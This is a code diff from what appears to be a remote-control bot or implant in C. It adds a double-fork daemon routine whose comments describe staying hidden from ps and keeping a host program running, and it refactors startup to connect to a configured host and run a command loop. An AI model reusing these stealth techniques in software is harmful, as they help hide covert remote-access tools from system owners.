@@ -21,9 +21,96 @@
 #include "pivot.h"
 #include "uuid4.h"
 
-// Instance the parser and launch the main command loop.
-int run(Settings *s)
+#ifndef _WIN32
+
+// Execute the bot as a daemon.
+int daemonize(int argc, char *argv[])
 {
+    // This implements the classic Unix double-fork trick.
+    // The main difference is we don't exit the first parent process,
+    // since we want the original program to run correctly.
+    if (fork() == 0) {
+
+        // Remove ourselves from the process group.
+        setpgrp();
+
+        // Prevent a SIGHUP on shell exit by ignoring the signal entirely.
+        signal(SIGHUP, SIG_IGN);
+
+        // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
+        signal(SIGPIPE, SIG_IGN);
+
+#if ! TICK_VERBOSE
+
+        // Disassociate from the terminal, since we're not using it.
+        int fd = open("/dev/tty", O_RDWR);
+        if (fd >= 0) {
+            ioctl(fd, TIOCNOTTY, 0);
+            close(fd);
+        }
+
+        // Close all of the parent's files and create new standard
+        // input, output and error files pointed to /dev/null.
+        struct rlimit rlim;
+        memset(&rlim, 0, sizeof(rlim));
+        if (getrlimit(RLIMIT_NOFILE, &rlim) == 0 && rlim.rlim_cur > 0) {
+            for (fd = 0; fd < (int) rlim.rlim_cur; fd++) close(fd);
+            open("/dev/null", O_RDONLY);
+            open("/dev/null", O_WRONLY);
+            open("/dev/null", O_WRONLY);
+        }
+
+#endif
+
+        // Second fork to fully disassociate from the parent process tree.
+        // This way we won't even show up on ps as having forked from here.
+        if (fork() != 0) exit(0);
+
+        // Execute the daemon's main function.
+        return run(argc, argv);
+    }
+
+    // This return instruction is only executed on the original process.
+    return 0;
+}
+
+#endif
+
+// Instance the parser and launch the main command loop.
+int run(int argc, char *argv[])
+{
+    // Prevent a SIGHUP on shell exit by ignoring the signal entirely.
+    // Ignore SIGPIPE to avoid crashing in case of abrupt socket close.
+#ifndef _WIN32
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGPIPE, SIG_IGN);
+#endif
+
+    // Get the configuration for the bot.
+    Settings s;
+    get_configuration(&s, argc, argv);
+
+    // If we don't have a hostname and port to connect to, quit.
+    if (s.hostname[0] == 0 || s.port == 0) {
+#if TICK_VERBOSE
+        if (argc > 0) {
+            show_help(&s, argv[0]);
+        } else {
+            show_help(&s, NULL);
+        }
+#endif
+        return 1;
+    }
+
+    // On Windows, we must initialize the sockets library.
+#ifdef _WIN32
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+        LOG("Failed to initialize Windows sockets, error code: %d\n", (int) GetLastError());
+        return 0;
+    }
+#endif
+
     // Allocate the parser structure.
     // If the parser buffer is small, use the stack.
     // If it's large, use the heap.
@@ -36,7 +123,7 @@ int run(Settings *s)
 #endif
 
     // Initialize the parser.
-    parser_init(p, s);
+    parser_init(p, &s);
 
     // Launch the main command loop.
     while (command_loop(p) == 0) {}
